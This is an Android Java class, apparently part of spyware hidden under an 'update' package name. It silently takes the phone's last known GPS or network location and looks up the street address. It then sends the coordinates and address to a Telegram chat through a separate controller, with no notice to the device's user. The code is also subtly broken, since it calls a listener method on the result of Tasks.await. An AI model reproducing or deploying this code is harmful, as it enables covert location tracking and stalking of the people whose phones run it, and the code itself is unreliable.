package com.kasari.update;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import androidx.core.location.LocationManagerCompat;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.Tasks;

public class LocationTracker {

    public static void sendLocation(Context context) {
        try {
            FusedLocationProviderClient fusedClient = 
                LocationServices.getFusedLocationProviderClient(context);
            
            Tasks.await(fusedClient.getLastLocation())
                .addOnSuccessListener(location -> {
                    if (location != null) {
                        TelegramController.sendLocation(context, 
                            location.getLatitude(), location.getLongitude());
                        
                        String address = getAddressFromLocation(context, 
                            location.getLatitude(), location.getLongitude());
                        
                        TelegramController.sendMessage(context, 
                            "📍 **Location Updated**\nLat: " + location.getLatitude() + 
                            "\nLon: " + location.getLongitude() + 
                            "\nAccuracy: " + location.getAccuracy() + "m" +
                            (address != null ? "\nAddress: " + address : ""));
                    }
                })
                .addOnFailureListener(e -> {
                    getLocationFromGPS(context);
                });
                
        } catch (Exception e) {
            getLocationFromGPS(context);
        }
    }

    private static void getLocationFromGPS(Context context) {
        try {
            LocationManager locationManager = 
                (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            if (locationManager != null) {
                Location location = locationManager.getLastKnownLocation(
                    LocationManager.GPS_PROVIDER);
                
                if (location == null) {
                    location = locationManager.getLastKnownLocation(
                        LocationManager.NETWORK_PROVIDER);
                }
                
                if (location != null) {
                    TelegramController.sendLocation(context, 
                        location.getLatitude(), location.getLongitude());
                    
                    TelegramController.sendMessage(context, 
                        "📍 **Location**\nLat: " + location.getLatitude() + 
                        "\nLon: " + location.getLongitude());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String getAddressFromLocation(Context context, double lat, double lon) {
        try {
            android.location.Geocoder geocoder = new android.location.Geocoder(context);
            java.util.List<android.location.Address> addresses = 
                geocoder.getFromLocation(lat, lon, 1);
            
            if (addresses != null && !addresses.isEmpty()) {
                android.location.Address address = addresses.get(0);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i <= address.getMaxAddressLineIndex(); i++) {
                    sb.append(address.getAddressLine(i)).append(", ");
                }
                return sb.toString();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}